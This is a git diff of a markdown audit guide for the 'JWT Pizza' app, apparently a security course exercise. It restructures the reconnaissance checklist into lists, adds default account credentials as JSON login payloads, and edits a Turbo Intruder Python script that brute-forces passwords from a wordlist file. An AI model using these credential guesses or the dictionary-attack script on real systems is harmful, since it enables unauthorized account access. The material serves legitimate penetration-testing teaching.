@@ -25,15 +25,32 @@
 
 ## Audit Guide
 
-| Area                                                               | JWT Example                                                                                                                                                                                     |
-| ------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Document all application user roles                                | Diner, franchisee, and an administrator.                                                                                                                                                        |
-| Know how the application is designed to works                      | Build a sitemap that shows the interaction between pages.                                                                                                                                       |
-| Know all the public endpoints                                      | Both JWT Pizza Service and JWT Pizza Factory.                                                                                                                                                   |
-| Read any available documentation                                   | In addition to public documentation, there are often developer blogs and technical white papers that provide interesting insights. For JWT this includes the /api/docs endpoint and /docs view. |
-| Know what OS, programming language, and 3rd party software is used | Linux ARM, JavaScript, Express, and UUID.                                                                                                                                                       |
-| Know what services the application uses                            | AWS CloudFront and ECS.                                                                                                                                                                         |
-| Know how the application is deployed                               | GitHub Actions.   
+
+User Roles:
+Diner, Franchisee, Admin
+
+| Documented Public Endpoints |
+| JWT Pizza Service | JWT Pizza |
+|-------------------|-----------|
+
+| Undocumented Public Endpoints |
+| JWT Pizza Service | JWT Pizza |
+|-------------------|-----------|
+
+For JWT this includes the /api/docs endpoint and /docs view.
+
+Software Used:
+- Linux ARM
+- JavaScript
+- Express
+- UUID.   
+
+Services Used:
+- AWS CloudFront
+- ECS.      
+
+How Deployed?
+- Github Actions
 
 
 ## Audit Questions
@@ -64,11 +81,13 @@ Here is a list of questions you can ask to help you find vulnerabilities that wo
 
 ## Penetration Testing ideas:
 - Check for default accounts, fuzz passwords
-
+{"email":"a@jwt.com", "password":"admin"}
+{"name":"pizza diner", "email":"d@jwt.com", "password":"diner"}
+{"name":"pizza franchisee", "email":"f@jwt.com", "password":"franchisee"}
 
 ### Password Dictionary attack
 
-Use Turbo intruder with this script
+Use Turbo intruder with this script, and specialLists script (see downloads)
 ```py
 def queueRequests(target, wordlists):
     engine = RequestEngine(endpoint=target.endpoint,
@@ -77,7 +96,7 @@ def queueRequests(target, wordlists):
                            pipeline=False
                            )
     # Check all the words in the UNIX dictionary
-    for word in open('/usr/share/dict/words'):
+    for word in open('C:\\Users\\taylo\\Downloads\\common_passwords.txt'):
         engine.queue(target.req, word.rstrip())
 
 # Success for any 200 response
